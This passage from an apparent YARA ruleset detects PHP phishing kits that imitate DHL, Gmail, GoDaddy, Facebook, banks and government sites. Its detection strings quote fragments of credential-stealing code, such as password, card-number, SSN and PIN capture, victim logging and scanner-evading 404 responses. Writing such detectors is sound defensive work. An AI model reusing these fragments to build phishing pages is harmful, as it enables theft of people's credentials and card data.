    condition:
        $trigger and PR00042 and PR00281
}

rule php_phishing_confirmpassword_001 : phishing
{
    strings:
        $trigger = "@$Confirmpassword = addslashes($_POST['Confirmpassword']);"
    condition:
        $trigger and PR00301
}

private rule PR05610 : trigger
{
    strings:
        $ps0 = "://credit-agricole-\".string_random("
    condition:
        $ps0
}

rule php_phishing_creditagricole_001 : phishing
{
    strings:
        $trigger = "header(\"location:"
    condition:
        $trigger and PR05610
}

private rule PR05611 : trigger
{
    strings:
        $ps0 = "preg_match('@(iPad|iPod|iPhone|Android"
    condition:
        $ps0
}

rule php_phishing_data_text_html_001 : phishing
{
    strings:
        $trigger = "url=data:text/html;"
    condition:
        $trigger and PR05611 and PR00596
}

rule php_phishing_DHL_001 : phishing
{
    strings:
        $trigger = "<title>MyDHL"
    condition:
        $trigger
}

rule php_phishing_DHL_002 : phishing
{
    strings:
        $trigger = "header(\"Location: http://parcel.dhl.co.uk\")"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_DHL_003 : phishing
{
    strings:
        $trigger = "DHL International GmbH. All rights reserved.</a></div>"
    condition:
        $trigger and PR00042
}

rule php_phishing_DHL_004 : phishing
{
    strings:
        $trigger = "DHL Express Tracking</title>"
    condition:
        $trigger and PR00042
}

private rule PR05612 : trigger
{
    strings:
        $ps0 = ">DHL - Account"
    condition:
        $ps0
}

rule php_phishing_DHL_005 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR05612 and PR00046
}

rule php_phishing_DHL_006 : phishing
{
    strings:
        $trigger = "DHL International Limited"
    condition:
        $trigger and PR00042
}

private rule PR05613 : trigger
{
    strings:
        $ps0 = "$DIR=md5(rand("
    condition:
        $ps0
}

rule php_phishing_dir_redirector_001 : phishing
{
    strings:
        $trigger = "header(\"location:$DIR\");"
    condition:
        $trigger and PR05613
}

private rule PR05614 : trigger
{
    strings:
        $ps0 = "\".$dst.\"/index.php?userid=\".$"
    condition:
        $ps0
}

rule php_phishing_dir_redirector_002 : phishing
{
    strings:
        $trigger = "@mkdir($"
    condition:
        $trigger and PR05614 and PR02741
}

rule php_phishing_discover_001 : phishing
{
    strings:
        $trigger = "section=cardmembersvcs/loginlogout"
    condition:
        $trigger and PR00371
}

rule php_phishing_docusign_001 : phishing
{
    strings:
        $trigger = "https://www.docusign.net/Member"
    condition:
        $trigger and PR00042 and PR00281
}

private rule PR05615 : trigger
{
    strings:
        $ps0 = "dolly_"
    condition:
        $ps0
}

rule php_phishing_dolly_landings_tool_001 : phishing
{
    strings:
        $trigger = "OtherFunctions::returnIfIsset(@"
    condition:
        $trigger and PR05615 and PR01431
}

private rule PR05616 : trigger
{
    strings:
        $ps0 = "SCAM PAGE PPL V5"
    condition:
        $ps0
}

rule php_phishing_dreambig_001 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05616
}

rule php_phishing_ebay_001 : phishing
{
    strings:
        $trigger = "eBay Inc. All Rights Reserved"
    condition:
        $trigger and PR00042
}

private rule PR05617 : trigger
{
    strings:
        $ps0 = "My EE login"
    condition:
        $ps0
}

rule php_phishing_EE_Limited_001 : phishing
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00042 and PR05617
}

rule php_phishing_ems_001 : phishing
{
    strings:
        $trigger = "<title>&#20013;&#22269;&#37038;&#25919;&#36895;&#36882;&#29289;&#27969;</title>"
    condition:
        $trigger
}

rule php_phishing_etisalat_001 : phishing
{
    strings:
        $trigger = "<title>my email - Etisalat Internet Mail"
    condition:
        $trigger
}

rule php_phishing_excel_001 : phishing
{
    strings:
        $trigger = "<title>Excel Online"
    condition:
        $trigger and PR00301
}

rule php_phishing_excel_001_02 : phishing
{
    strings:
        $trigger = "<title>Excel Document Cloud</title>"
    condition:
        $trigger
}

private rule PR05618 : trigger
{
    strings:
        $ps0 = "$email:$pass:IP -> $ip:UA"
    condition:
        $ps0
}

rule php_phishing_facebook_001 : phishing
{
    strings:
        $trigger = "header(\"Location: https://facebook.com"
    condition:
        $trigger and PR05618
}

rule php_phishing_facebook_002 : phishing
{
    strings:
        $trigger = "Use Facebook Account to Login"
    condition:
        $trigger and PR00042
}

rule php_phishing_fedex_001 : phishing
{
    strings:
        $trigger = "<TITLE>FEDEX | Tracking"
    condition:
        $trigger and PR00050
}

rule php_phishing_fedex_002 : phishing
{
    strings:
        $trigger = "FEDEX Express Tracking<"
    condition:
        $trigger and PR00042
}

private rule PR05619 : trigger
{
    strings:
        $ps0 = "##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##"
    condition:
        $ps0
}

rule php_phishing_fmd_001 : phishing
{
    strings:
        $trigger = "###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########"
    condition:
        $trigger and PR05619 and PR02534
}

rule php_phishing_freemobs_001 : phishing
{
    strings:
        $trigger = "require(\"send.php\"); file_put_contents($_SESSION['success'], $rx, FILE_APPEND); print"
    condition:
        $trigger and PR00301
}

rule php_phishing_freemobs_002 : phishing
{
    strings:
        $trigger = "include(\"fmob2.html\");"
    condition:
        $trigger
}

rule php_phishing_freemobs_003 : phishing
{
    strings:
        $trigger = ">&#70;&#114;&#101;&#101;&#32;&#77;&#111;&#98;&#105;&#108;&#101;&#32;&#45;&#32;&#66;"
    condition:
        $trigger and PR00042
}

private rule PR05620 : trigger
{
    strings:
        $ps0 = "$n1  = $_POST['nutzername'];"
    condition:
        $ps0
}

rule php_phishing_generic_001 : phishing
{
    strings:
        $trigger = "header("
    condition:
        $trigger and PR05620
}

rule php_phishing_generic_001_001 : phishing
{
    strings:
        $trigger = "header('location:'.$m.$i.'/security/');"
    condition:
        $trigger
}

rule php_phishing_generic_003 : phishing
{
    strings:
        $trigger = "<title>Cryptogramme visuel Information</title>"
    condition:
        $trigger and PR00247
}

rule php_phishing_generic_004 : phishing
{
    strings:
        $trigger = "$message .= \"Atm pin"
    condition:
        $trigger
}

private rule PR05621 : trigger
{
    strings:
        $ps0 = "md5(microtime("
    condition:
        $ps0
}

private rule PR05622 : trigger
{
    strings:
        $ps0 = "gethostbyaddr(getenv(\"REMOTE_ADDR\")),'google') !== false"
    condition:
        $ps0
}

rule php_phishing_generic_005 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05621 and PR05622
}

rule php_phishing_generic_006 : phishing
{
    strings:
        $trigger = "<title>NAB Internet Banking"
    condition:
        $trigger
}

rule php_phishing_generic_007 : phishing
{
    strings:
        $trigger = "$subject = \"PPL Login : | $ip\";"
    condition:
        $trigger
}

rule php_phishing_generic_009 : phishing
{
    strings:
        $trigger = "Created by l33bo_phishers"
    condition:
        $trigger and PR00727
}

rule php_phishing_generic_010 : phishing
{
    strings:
        $trigger = "$message  = \"+=========================+ Credit Card Info"
    condition:
        $trigger
}

rule php_phishing_generic_011 : phishing
{
    strings:
        $trigger = "mailer($adminemail,$adminemail,\"New info\",$fcontent);"
    condition:
        $trigger and PR00301
}

rule php_phishing_generic_012 : phishing
{
    strings:
        $trigger = "$message = \"Good day Fire Lord"
    condition:
        $trigger
}

rule php_phishing_generic_013 : phishing
{
    strings:
        $trigger = "$SubjectLine = \"Hotmail $ip\";"
    condition:
        $trigger and PR00301
}

rule php_phishing_generic_014 : phishing
{
    strings:
        $trigger = "name=chalbhai id=chalbhai method=post"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_015 : phishing
{
    strings:
        $trigger = "$vName = base64_encode($_GET[\"sec\"]);$nName = base64_encode($_GET[\"token\"]);header(\"Location: '.$urlz"
    condition:
        $trigger
}

rule php_phishing_generic_016 : phishing
{
    strings:
        $trigger = "var page = \"./Login?For=Start=LOG <?php include"
    condition:
        $trigger
}

private rule PR05623 : trigger
{
    strings:
        $ps0 = "PRIVATE  PpL SCAMA  2015"
    condition:
        $ps0
}

rule php_phishing_generic_017 : phishing
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR05623
}

rule php_phishing_generic_018 : phishing
{
    strings:
        $trigger = "<?php include 'random.php'; echo $randomise; ?>\""
    condition:
        $trigger
}

private rule PR05624 : trigger
{
    strings:
        $ps0 = "DR_Yassine"
    condition:
        $ps0
}

rule php_phishing_generic_019 : phishing
{
    strings:
        $trigger = ".com"
    condition:
        $trigger and PR05624
}

rule php_phishing_generic_020 : phishing
{
    strings:
        $trigger = "$file = fopen(\"drspam.txt"
    condition:
        $trigger and PR00732
}

rule php_phishing_generic_021 : phishing
{
    strings:
        $trigger = "Created by l33bo_phishers"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_022 : phishing
{
    strings:
        $trigger = "$VictimInfo .= \""
    condition:
        $trigger and PR00301
}

rule php_phishing_generic_023 : phishing
{
    strings:
        $trigger = "if($clicid == \"13698\"){"
    condition:
        $trigger and PR00092
}

rule php_phishing_generic_024 : phishing
{
    strings:
        $trigger = "if (strpos($str, \"Bienvenue dans votre Espace Client"
    condition:
        $trigger and PR00092
}

rule php_phishing_generic_025 : phishing
{
    strings:
        $trigger = "La Banque Postale</title>"
    condition:
        $trigger and PR00042
}

private rule PR05625 : trigger
{
    strings:
        $ps0 = "if($_POST[Exmoth] < gmdate(\"m\") and $_POST[Exyear] == gmdate(\"Y\")){"
    condition:
        $ps0
}

private rule PR05626 : trigger
{
    strings:
        $ps0 = "nclude \"send.php\";"
    condition:
        $ps0
}

rule php_phishing_generic_025_02 : phishing
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR05625 and PR05626
}

rule php_phishing_generic_026 : phishing
{
    strings:
        $trigger = ">Impots.gouv.fr - Accueil"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_027 : phishing
{
    strings:
        $trigger = ">Free Mobile - Bienvenue dans votre Espace Abo"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_028 : phishing
{
    strings:
        $trigger = "www.t-online.de/service/kundencenter/index_login_hilfe.html\" target=\"toi\" title=\"Hilfe aufrufen\">"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_029 : phishing
{
    strings:
        $trigger = "TradeKey Member Login<"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_030 : phishing
{
    strings:
        $trigger = "$_SESSION['geoipcodeup'] = $getipcode = base64_decode(\""
    condition:
        $trigger and PR02741
}

rule php_phishing_generic_032 : phishing
{
    strings:
        $trigger = "($BASE.\"/.wtf/\".$ACN.\".txt\");"
    condition:
        $trigger and PR00431
}

rule php_phishing_generic_033 : phishing
{
    strings:
        $trigger = "if(strlen($PIN) < 4 || strlen($ACN) < 4){"
    condition:
        $trigger
}

private rule PR05627 : trigger
{
    strings:
        $ps0 = ">Pisher Black Plugin"
    condition:
        $ps0
}

rule php_phishing_generic_034 : phishing
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR05627
}

private rule PR05628 : trigger
{
    strings:
        $ps0 = "Brute"
    condition:
        $ps0
}

rule php_phishing_generic_034_02 : phishing
{
    strings:
        $trigger = "Pisher Plugin Upload Shell"
    condition:
        $trigger and PR05628
}

private rule PR05629 : trigger
{
    strings:
        $ps0 = "\"));echo \"\\x"
    condition:
        $ps0
}

rule php_phishing_generic_034_03 : phishing
{
    strings:
        $trigger = "<?php echo(base64_decode(\""
    condition:
        $trigger and PR00719 and PR05629
}

rule php_phishing_generic_035 : phishing
{
    strings:
        $trigger = "$host = bin2hex ($_SERVER['HTTP_HOST']);"
    condition:
        $trigger and PR00431
}

rule php_phishing_generic_036 : phishing
{
    strings:
        $trigger = "input type=\"hidden\" name=\"cc\" required"
    condition:
        $trigger and PR01351
}

private rule PR05630 : trigger
{
    strings:
        $ps0 = "JF9QT1NUWydiaWxsaW5nX2ZpcnN0X25hbWUnX"
    condition:
        $ps0
}

rule php_phishing_generic_037 : phishing
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR05630
}

rule php_phishing_generic_038 : phishing
{
    strings:
        $trigger = "<title>Re-Validate Your Mailbox<"
    condition:
        $trigger
}

private rule PR05631 : trigger
{
    strings:
        $ps0 = "$hash = md5($"
    condition:
        $ps0
}

rule php_phishing_generic_039 : phishing
{
    strings:
        $trigger = "header(\"Location: login.php?&sessionid=$hash&securessl=true"
    condition:
        $trigger and PR05631
}

private rule PR05632 : trigger
{
    strings:
        $ps0 = "top.location = page;"
    condition:
        $ps0
}

rule php_phishing_generic_040 : phishing
{
    strings:
        $trigger = "$randomString = substr(str_shuffle(\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"), 0, $length);"
    condition:
        $trigger and PR05632
}

private rule PR05633 : trigger
{
    strings:
        $ps0 = "$Card = $_POST['ccnumber'];"
    condition:
        $ps0
}

rule php_phishing_generic_041 : phishing
{
    strings:
        $trigger = "$hostname = gethostbyaddr($ip);"
    condition:
        $trigger and PR00301 and PR05633
}

rule php_phishing_generic_042 : phishing
{
    strings:
        $trigger = ">Confirm Your Identity | OurTime.com"
    condition:
        $trigger and PR00042
}

private rule PR05634 : trigger
{
    strings:
        $ps0 = "function is_bitch($user_agent)"
    condition:
        $ps0
}

private rule PR05635 : trigger
{
    strings:
        $ps0 = "$user_agent, $bitch"
    condition:
        $ps0
}

rule php_phishing_generic_043 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR05634 and PR00431 and PR05635 and PR05622
}

rule php_phishing_generic_044 : phishing
{
    strings:
        $trigger = "<title><?php echo $pass != \"\" ? $pass : \"\" ?> - &#37038;&#31665;&#39564;&#35777;"
    condition:
        $trigger
}

private rule PR05636 : trigger
{
    strings:
        $ps0 = "$yuh = ucfirst($yuh);"
    condition:
        $ps0
}

rule php_phishing_generic_045 : phishing
{
    strings:
        $trigger = "<title>"
    condition:
        $trigger and PR05636 and PR00301
}

rule php_phishing_generic_046 : phishing
{
    strings:
        $trigger = "<title>FuckMailer</title>"
    condition:
        $trigger
}

rule php_phishing_generic_047 : phishing
{
    strings:
        $trigger = "header(\"Location: $secfile?email=$email\")"
    condition:
        $trigger and PR03806
}

rule php_phishing_generic_048 : phishing
{
    strings:
        $trigger = "/A-mail.php\" method=\"POST\">"
    condition:
        $trigger and PR00042 and PR00278
}

rule php_phishing_generic_049 : phishing
{
    strings:
        $trigger = "/us1.php\" method=\"POST\">"
    condition:
        $trigger and PR00042 and PR00278
}

private rule PR05637 : trigger
{
    strings:
        $ps0 = "/incc.php\" method=\"POST\">"
    condition:
        $ps0
}

rule php_phishing_generic_050 : phishing
{
    strings:
        $trigger = "Account"
    condition:
        $trigger and PR00042 and PR05637
}

rule php_phishing_generic_051 : phishing
{
    strings:
        $trigger = "/send-email2.php\" method=\"POST\">"
    condition:
        $trigger and PR00042 and PR00278
}

private rule PR05638 : trigger
{
    strings:
        $ps0 = "=\"Social Security number\";"
    condition:
        $ps0
}

rule php_phishing_generic_052 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05638
}

private rule PR05639 : trigger
{
    strings:
        $ps0 = "$cd= fetch_value($hhhhh,'class=\"blanc\">"
    condition:
        $ps0
}

rule php_phishing_generic_053 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05639
}

private rule PR05640 : trigger
{
    strings:
        $ps0 = "(in_array(\"$shortip\", $deny))"
    condition:
        $ps0
}

rule php_phishing_generic_054 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05640
}

private rule PR05641 : trigger
{
    strings:
        $ps0 = ">Sign in your Email<"
    condition:
        $ps0
}

private rule PR05642 : trigger
{
    strings:
        $ps0 = "<form name=\"validation\" method=\"POST\" action=\""
    condition:
        $ps0
}

rule php_phishing_generic_055 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05641 and PR04645 and PR05642
}

rule php_phishing_generic_056 : phishing
{
    strings:
        $trigger = "include('blocker.php')"
    condition:
        $trigger and PR00273
}

rule php_phishing_generic_057 : phishing
{
    strings:
        $trigger = "$data = \"HOT $device->$user,$pass,$ip<$hostname"
    condition:
        $trigger and PR03964 and PR04718
}

private rule PR05643 : trigger
{
    strings:
        $ps0 = "function isMobile()"
    condition:
        $ps0
}

rule php_phishing_generic_058 : phishing
{
    strings:
        $trigger = "$md5 = md5(uniqid(time()));"
    condition:
        $trigger and PR05643 and PR00247
}

private rule PR05644 : trigger
{
    strings:
        $ps0 = "self.location.replace(loc);"
    condition:
        $ps0
}

rule php_phishing_generic_058_02 : phishing
{
    strings:
        $trigger = "$md5 = md5(uniqid(time()));"
    condition:
        $trigger and PR05644 and PR00247
}

rule php_phishing_generic_059 : phishing
{
    strings:
        $trigger = "require \"phishtank_check.php\""
    condition:
        $trigger
}

rule php_phishing_generic_060 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR00555
}

// MANUAL FIX NECESSARY
rule php_phishing_generic_061 : phishing
{
    strings:
        $trigger = "require_once('block_detectors.php');"
        $php_phishing_generic_061_r0 = /\$message[\s]*\.?=[\s]*['\"][\s]*[-+=*!@#~_.\|\[\]><]{3,}[\s]*[-+=*!@#~_.><\w]{2,}/
    condition:
        $trigger and PR00279 and $php_phishing_generic_061_r0
}

private rule PR05645 : trigger
{
    strings:
        $ps0 = "action=\"details.php?&sessionid=<?php echo $hash; ?>&securessl=true\" method=\"POST\""
    condition:
        $ps0
}

rule php_phishing_generic_062 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05645
}

private rule PR05646 : trigger
{
    strings:
        $ps0 = "require \"../protect.php\""
    condition:
        $ps0
}

rule php_phishing_generic_063 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05646
}

private rule PR05647 : trigger
{
    strings:
        $ps0 = "<title>Confirmation - Update"
    condition:
        $ps0
}

rule php_phishing_generic_064 : phishing
{
    strings:
        $trigger = "header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error'"
    condition:
        $trigger and PR05647
}

private rule PR05648 : trigger
{
    strings:
        $ps0 = "<title>PHP Secure Professional Captcha"
    condition:
        $ps0
}

rule php_phishing_generic_065 : phishing
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR05648 and PR00050 and PR00323
}

rule php_phishing_generic_066 : phishing
{
    strings:
        $trigger = "<h1>Confirm your details to claim your money</h1>"
    condition:
        $trigger and PR00042 and PR00278
}

rule php_phishing_generic_067 : phishing
{
    strings:
        $trigger = ", $_SERVER['REMOTE_ADDR'].' '.date('c').\"\\n\")"
    condition:
        $trigger and PR00273 and PR01403
}

rule php_phishing_generic_068 : phishing
{
    strings:
        $trigger = "<title>impots.gouv.fr"
    condition:
        $trigger
}

rule php_phishing_generic_069 : phishing
{
    strings:
        $trigger = ">DOMAIN SEARCH ENGINE REGISTRATION"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_069_02 : phishing
{
    strings:
        $trigger = "<title>Domain Name Search Engine"
    condition:
        $trigger
}

rule php_phishing_generic_070 : phishing
{
    strings:
        $trigger = "<title>Pay</title>"
    condition:
        $trigger
}

private rule PR05649 : trigger
{
    strings:
        $ps0 = "XBOOMBER_check.php"
    condition:
        $ps0
}

rule php_phishing_generic_071 : phishing
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR05649
}

rule php_phishing_generic_072 : phishing
{
    strings:
        $trigger = "header('location:https://www.login.alibaba.com');"
    condition:
        $trigger
}

rule php_phishing_generic_073 : phishing
{
    strings:
        $trigger = "://www.bdo.com.ph/"
    condition:
        $trigger and PR00042
}

rule php_phishing_generic_074 : phishing
{
    strings:
        $trigger = "fwrite($save,$code);fclose($save);exit(header(\"Location:"
    condition:
        $trigger
}

rule php_phishing_generic_075 : phishing
{
    strings:
        $trigger = "<title>Secure Login"
    condition:
        $trigger
}

rule php_phishing_generic_076 : phishing
{
    strings:
        $trigger = "if ($_SESSION['_cctype_"
    condition:
        $trigger and PR00431
}

private rule PR05650 : trigger
{
    strings:
        $ps0 = "xcazanova"
    condition:
        $ps0
}

rule php_phishing_generic_077 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05650
}

rule php_phishing_generic_078 : phishing
{
    strings:
        $trigger = "<title>Sign In |"
        $php_phishing_generic_078_w0 = "Opps! The username does not exist. Please, try again or sign up."
    condition:
        $trigger and not $php_phishing_generic_078_w0
}

private rule PR05651 : trigger
{
    strings:
        $ps0 = "$ssn = $_SESSION['ssn'];"
    condition:
        $ps0
}

rule php_phishing_generic_079 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05651
}

private rule PR05652 : trigger
{
    strings:
        $ps0 = "if(mkdir($random, 0755)){"
    condition:
        $ps0
}

rule php_phishing_generic_080 : phishing
{
    strings:
        $trigger = "curl_exec"
    condition:
        $trigger and PR05652 and PR01362
}

private rule PR05653 : trigger
{
    strings:
        $ps0 = "window.onload = function()"
    condition:
        $ps0
}

private rule PR05654 : trigger
{
    strings:
        $ps0 = "(event.keyCode<48"
    condition:
        $ps0
}

private rule PR05655 : trigger
{
    strings:
        $ps0 = "document.getElementById(\"<?echo $"
    condition:
        $ps0
}

rule php_phishing_generic_082 : phishing
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR05653 and PR01382 and PR05654 and PR05655
}

private rule PR05656 : trigger
{
    strings:
        $ps0 = "$details->bank->name;"
    condition:
        $ps0
}

rule php_phishing_generic_083 : phishing
{
    strings:
        $trigger = "submitHandler: function(form)"
    condition:
        $trigger and PR05656
}

rule php_phishing_generic_084 : phishing
{
    strings:
        $trigger = "CHASE_SPOX"
    condition:
        $trigger and PR00273 and PR01403
}

rule php_phishing_generic_085 : phishing
{
    strings:
        $trigger = "<title>Validating"
    condition:
        $trigger
}

rule php_phishing_generic_085_02 : phishing
{
    strings:
        $trigger = "<title>&#83;&#105;&#103;&#110;&#32;"
    condition:
        $trigger
}

private rule PR05657 : trigger
{
    strings:
        $ps0 = "y Spox"
    condition:
        $ps0
}

rule php_phishing_generic_086 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05657
}

private rule PR05658 : trigger
{
    strings:
        $ps0 = "elseif($x != \"\" AND $_GET['page']=='mobiNet"
    condition:
        $ps0
}

rule php_phishing_generic_088 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05658
}

rule php_phishing_generic_089 : phishing
{
    strings:
        $trigger = "Created by TOPFUD.com"
    condition:
        $trigger and PR00273
}

rule php_phishing_generic_090 : phishing
{
    strings:
        $trigger = "@header(\"Location: /\");exit;}@setcookie(\""
    condition:
        $trigger and PR00391
}

rule php_phishing_generic_091 : phishing
{
    strings:
        $trigger = "SMS Verificacion"
    condition:
        $trigger and PR00042
}

private rule PR05659 : trigger
{
    strings:
        $ps0 = "str_replace('./index/"
    condition:
        $ps0
}

rule php_phishing_generic_092 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00634 and PR05659
}

private rule PR05660 : trigger
{
    strings:
        $ps0 = "window.location.href"
    condition:
        $ps0
}

rule php_phishing_generic_093 : phishing
{
    strings:
        $trigger = ");exit;}"
    condition:
        $trigger and PR00042 and PR05660 and PR02051
}

rule php_phishing_generic_094 : phishing
{
    strings:
        $trigger = "<title>Login - Account </title>"
    condition:
        $trigger
}

rule php_phishing_generic_095 : phishing
{
    strings:
        $trigger = "'.$name.$type,base64_decode(explode(',',"
    condition:
        $trigger and PR00435
}

rule php_phishing_generic_095_02 : phishing
{
    strings:
        $trigger = "subject = \"PAYPAL LOGIN: \".$_POST"
    condition:
        $trigger and PR01330 and PR05482
}

private rule PR05661 : trigger
{
    strings:
        $ps0 = "<title>FBI Terminal"
    condition:
        $ps0
}

rule php_phishing_generic_096 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\""
    condition:
        $trigger and PR05661
}

rule php_phishing_generic_097 : phishing
{
    strings:
        $trigger = "define('SITE_ROOT', 'https://webmail.gmx.com.prof-upt.cf/');"
    condition:
        $trigger
}

private rule PR05662 : trigger
{
    strings:
        $ps0 = "Admin ICQ: https://icq.im/hexorstore"
    condition:
        $ps0
}

rule php_phishing_generic_098 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05662 and PR00391
}

private rule PR05663 : trigger
{
    strings:
        $ps0 = ".$pass."
    condition:
        $ps0
}

private rule PR05664 : trigger
{
    strings:
        $ps0 = "foreach($_POST as $variable"
    condition:
        $ps0
}

rule php_phishing_generic_099 : phishing
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR05663 and PR01403 and PR05664
}

private rule PR05665 : trigger
{
    strings:
        $ps0 = "$password = $_POST["
    condition:
        $ps0
}

rule php_phishing_generic_100 : phishing
{
    strings:
        $trigger = "fopen($"
    condition:
        $trigger and PR05162 and PR01362 and PR05665
}

private rule PR05666 : trigger
{
    strings:
        $ps0 = "if(isset($_SESSION["
    condition:
        $ps0
}

rule php_phishing_generic_101 : phishing
{
    strings:
        $trigger = "function loggedin"
    condition:
        $trigger and PR00042 and PR03133 and PR05666
}

rule php_phishing_generic_redirect_002 : phishing
{
    strings:
        $trigger = "header(\"Location: InitialTangerine.php\");"
    condition:
        $trigger
}

rule php_phishing_generic_redirect_002_02 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.tangerine.ca"
    condition:
        $trigger
}

private rule PR05667 : trigger
{
    strings:
        $ps0 = "$_SESSION['justowner'] = 'green';"
    condition:
        $ps0
}

rule php_phishing_generic_redirect_003 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05667
}

private rule PR05668 : trigger
{
    strings:
        $ps0 = "@hotmail.') !== false || stripos($domain_check, '@outlook"
    condition:
        $ps0
}

rule php_phishing_generic_redirect_004 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05668
}

// MANUAL FIX NECESSARY
private rule PR05669 : trigger
{
    strings:
        $ps0 = "Publishers Representatives Limited"
    condition:
        $ps0
}

rule php_phishing_globalsources_001 : phishing
{
    strings:
        $trigger = "<html"
        $php_phishing_globalsources_001_r0 = /\$_POST\[.[pP][aA][sS][sS][wW][oO][rR][dD].\]/
    condition:
        $trigger and PR00301 and PR05669 and $php_phishing_globalsources_001_r0
}

rule php_phishing_gmail_001 : phishing
{
    strings:
        $trigger = "Location: https://gmail.com"
    condition:
        $trigger
}

rule php_phishing_gmail_002 : phishing
{
    strings:
        $trigger = "<title>Google Secure Docs"
    condition:
        $trigger
}

rule php_phishing_gmail_003 : phishing
{
    strings:
        $trigger = "header(\"location: http://www.google.com/mobile/gmail/#utm_source=en-cpp-g4mc-gmhp"
    condition:
        $trigger
}

rule php_phishing_gmail_004 : phishing
{
    strings:
        $trigger = "<title>Gmail: Email from Google</title>"
    condition:
        $trigger
}

rule php_phishing_gmail_004_001 : phishing
{
    strings:
        $trigger = "<title>Gmail</title>"
    condition:
        $trigger
}

private rule PR05670 : trigger
{
    strings:
        $ps0 = "<script type=\"text/javascript\">/* Anti-spam. Want to say hello? Contact (base64)"
    condition:
        $ps0
}

rule php_phishing_gmail_005 : phishing
{
    strings:
        $trigger = "Google"
    condition:
        $trigger and PR00042 and PR05670
}

private rule PR05671 : trigger
{
    strings:
        $ps0 = "<title>E-mail account validation<"
    condition:
        $ps0
}

rule php_phishing_gmail_006 : phishing
{
    strings:
        $trigger = ">Powered By Google Docs 201"
    condition:
        $trigger and PR05671
}

rule php_phishing_gmail_007 : phishing
{
    strings:
        $trigger = "header(\"Location: https://docs.google.com/templates?type=spreadsheets&"
    condition:
        $trigger and PR00301 and PR01123
}

private rule PR05672 : trigger
{
    strings:
        $ps0 = "rand=13InboxLight"
    condition:
        $ps0
}

rule php_phishing_gmail_008 : phishing
{
    strings:
        $trigger = "1774256418&fid"
    condition:
        $trigger and PR00273 and PR05672
}

rule php_phishing_gmail_009 : phishing
{
    strings:
        $trigger = "header( \"Location: index.php?Email=$username&.rand=13InboxLight.aspx?n"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_godaddy_001 : phishing
{
    strings:
        $trigger = "fwrite($file,\"Password"
    condition:
        $trigger and PR00042 and PR00281 and PR00443
}

rule php_phishing_godaddy_002 : phishing
{
    strings:
        $trigger = "<title>Verify Email</title>"
    condition:
        $trigger and PR00281 and PR00443
}

private rule PR05673 : trigger
{
    strings:
        $ps0 = "<a href=\"https://www.secureserver.net/legal-agreement?id=privacy"
    condition:
        $ps0
}

rule php_phishing_godaddy_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00441 and PR05673
}

rule php_phishing_godaddy_003_02 : phishing
{
    strings:
        $trigger = "--+ Godaddy True Login Verified  +--"
    condition:
        $trigger and PR00273
}

private rule PR05674 : trigger
{
    strings:
        $ps0 = "https://sso.godaddy.com/login?app"
    condition:
        $ps0
}

rule php_phishing_godaddy_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00441 and PR05674
}

rule php_phishing_godaddy_005 : phishing
{
    strings:
        $trigger = "uxel.urls.myPinUrl = 'https://mya.godaddy.com/pin"
    condition:
        $trigger and PR00042 and PR00281 and PR00443
}

rule php_phishing_godaddy_006 : phishing
{
    strings:
        $trigger = "<title>Godaddy Verification"
    condition:
        $trigger
}

rule php_phishing_google_001 : phishing
{
    strings:
        $trigger = "header(\"location: https://drive.google.com/#my-drive\");"
    condition:
        $trigger
}

rule php_phishing_google_002 : phishing
{
    strings:
        $trigger = ">One Account. All of Google"
    condition:
        $trigger and PR00042
}

rule php_phishing_google_003 : phishing
{
    strings:
        $trigger = "<p class=\"subline\">Google Drive"
    condition:
        $trigger and PR00042
}

rule php_phishing_google_004 : phishing
{
    strings:
